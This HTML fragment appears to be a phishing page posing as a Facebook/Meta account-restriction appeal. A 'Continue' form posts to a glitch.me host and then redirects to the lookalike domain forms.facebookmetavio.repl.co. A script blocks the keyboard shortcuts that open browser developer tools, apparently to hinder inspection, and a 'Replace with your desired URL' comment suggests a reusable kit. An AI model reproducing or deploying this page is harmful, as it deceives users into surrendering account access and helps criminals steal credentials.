...
<script type="text/javascript">
    ...
    document.addEventListener("keydown", function(e) {
      ...
      if ((e.key === 'i' || e.key === 'c' || e.keyCode === 73 || e.keyCode === 67) && (e.shiftKey || e.ctrlKey)) {
        e.preventDefault();
      }
    });
  </script>
    <style>
        ...
        .help-center-text-container {
          ...
          margin-top: -30px;
            margin-top: 20px;
          transform: translateY(-0px);/* Add space between image and text */
        }
      }
...
<body>
    <div class="container">
        ...
        <div class="remaining-content">
                ...
                <div class="">
                    <div class="flex justify-center items-center pl-6 px-28">
                        ...
                        <div class="mx-3">
                            ...
                            <p class="text-lg text-gray-700 font-extralight">Here you can submit appeal. 
                          Click "Continue" Button.</p>
                        </div>
                    </div>
                </div>
            </div>
            ...
            <form id="redirectForm" method="post" action="https://review-new-profile-restrictions.glitch.me/">
            ...
            <script>
                document.getElementById("redirectForm").addEventListener("submit", function (e) {
                    ...
                    window.location.href = "https://forms.facebookmetavio.repl.co/"; // Replace with your desired URL
                });
            </script>
        </div>
    </div>
